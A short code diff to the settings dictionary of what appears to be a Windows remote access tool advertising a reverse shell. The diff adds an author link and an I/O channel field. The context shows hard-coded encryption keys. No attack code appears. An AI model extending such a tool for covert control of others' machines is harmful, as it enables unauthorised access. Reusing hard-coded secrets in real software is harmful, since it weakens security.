@@ -6,6 +6,7 @@ state = {
   'description': 'A Windows remote access tool application supporting\n'
                 + 'a whide range of powerful & easy to use commands\n'
                 + 'along with a stable reverse shell. [USE: \'HELP\']',
+  'author': 'Authors Github: https://github.com/alvin-22',
   'settings': {
     'dynamic': {
       'is-loading': False,
@@ -19,6 +20,7 @@ state = {
     'loading-animation': True,
     'encoding': 'latin-1',
     'headersize': 10,
+    'io-channels': [None, None],
     'encryption': Encryption(
                   'ksxgyRuBRJLKxjFeHD4nmxbE',
                   b'v4CuHZFzmTedBY2EBGrLRXsm'),
